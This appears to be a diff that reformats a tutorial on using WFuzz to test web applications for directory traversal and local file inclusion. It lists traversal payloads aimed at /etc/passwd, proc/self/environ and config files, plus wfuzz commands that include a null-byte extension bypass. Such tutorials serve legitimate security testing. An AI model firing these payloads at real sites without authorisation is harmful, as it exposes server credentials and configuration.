@@ -1,4 +1,5 @@
-Fuzzing is a testing technique that sends large numbers of unexpected or invalid inputs to an application to identify vulnerabilities like File Inclusion and Directory Traversal. Fuzzing tools automate this process, making it easier to detect exploitable vulnerabilities.
+Fuzzing is a testing technique that sends large numbers of unexpected or invalid inputs to an application to identify vulnerabilities like File Inclusion and Directory Traversal. Fuzzing tools automate
+this process, making it easier to detect exploitable vulnerabilities.
 
 Here’s how to use a fuzzing tool, such as WFuzz, for testing File Inclusion and Directory Traversal vulnerabilities.
 
@@ -8,47 +9,39 @@ Install WFuzz (or a similar tool). WFuzz is a popular open-source tool for web f
 
 Installation:
 On Linux:
-bash
-Copy code
 sudo apt install wfuzz
+
 On macOS (via Homebrew):
-bash
-Copy code
 brew install wfuzz
+
 2. Identify the Target
 Locate the vulnerable parameter in the target URL. For example:
 
 A file inclusion parameter:
-arduino
-Copy code
+
 http://example.com/index.php?page=home.php
+
 3. Prepare a Wordlist
 Fuzzing requires a wordlist containing possible payloads for directory traversal or file inclusion.
 
 Example payloads for directory traversal:
-
-bash
-Copy code
 ../../../../etc/passwd
 ../../../../windows/system32/drivers/etc/hosts
 ../../../../var/www/html/config.php
 ../../../../proc/self/environ
-Use an existing wordlist or generate your own. Popular wordlists are available in SecLists:
 
-arduino
-Copy code
+Use an existing wordlist or generate your own. Popular wordlists are available in SecLists:
 https://github.com/danielmiessler/SecLists
+
 4. Fuzz for Directory Traversal
 Command Example: Basic Directory Traversal
-bash
-Copy code
 wfuzz -u http://example.com/index.php?page=FUZZ -w /path/to/wordlist.txt
+
 Explanation:
 -u: Specifies the URL with the FUZZ placeholder.
 -w: Specifies the path to the wordlist file.
 Sample Output:
-plaintext
-Copy code
+
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                        *
 ********************************************************
@@ -66,43 +59,36 @@ If the response status is 200, it means the file was successfully included. For 
 
 5. Fuzz for Local File Inclusion (LFI)
 Command Example: Testing for Common Files
-bash
-Copy code
+
 wfuzz -u http://example.com/index.php?page=FUZZ -w /path/to/common-files.txt
 Use a wordlist containing common file names like home.php, about.php, config.php.
 Command Example: Combining Path Traversal with Known Files
-bash
-Copy code
+
 wfuzz -u http://example.com/index.php?page=../../../../FUZZ -w /path/to/known-files.txt
 Payloads in known-files.txt:
-bash
-Copy code
 etc/passwd
 proc/self/environ
 var/www/html/config.php
 windows/system32/drivers/etc/hosts
+
 6. Fuzzing for Null Byte Injection (Legacy Exploits)
 Some older servers are vulnerable to null byte injection, which terminates strings early. For example:
 
 Command Example: Adding Null Byte
-bash
-Copy code
 wfuzz -u "http://example.com/index.php?page=FUZZ%00" -w /path/to/wordlist.txt
+
 This appends a null byte (%00) to bypass certain file extension checks.
+
 7. Advanced Fuzzing with Filters
 Filter by Response Code
 To filter for successful responses (e.g., HTTP 200):
-
-bash
-Copy code
 wfuzz -u http://example.com/index.php?page=FUZZ -w /path/to/wordlist.txt --hc 404
 --hc 404: Hide responses with a 404 status code.
+
 Filter by Content Size
 If vulnerable responses have distinct content lengths:
-
-bash
-Copy code
 wfuzz -u http://example.com/index.php?page=FUZZ -w /path/to/wordlist.txt --hs "Content-Length: 500"
+
 8. Analyze the Results
 Review the results for successful file inclusions or suspicious responses:
 
@@ -110,16 +96,11 @@ A 200 response with unexpected content may indicate that a file was included.
 Look for system file contents (e.g., /etc/passwd).
 Example Walkthrough: Testing a File Inclusion Vulnerability
 Scenario:
-The web application includes files based on the page parameter:
-
-arduino
-Copy code
+The web application includes files based on the page parameter
 http://example.com/index.php?page=home.php
 Steps:
 Run the following WFuzz command to fuzz for common sensitive files:
 
-bash
-Copy code
 wfuzz -u http://example.com/index.php?page=FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
 Review the results:
 
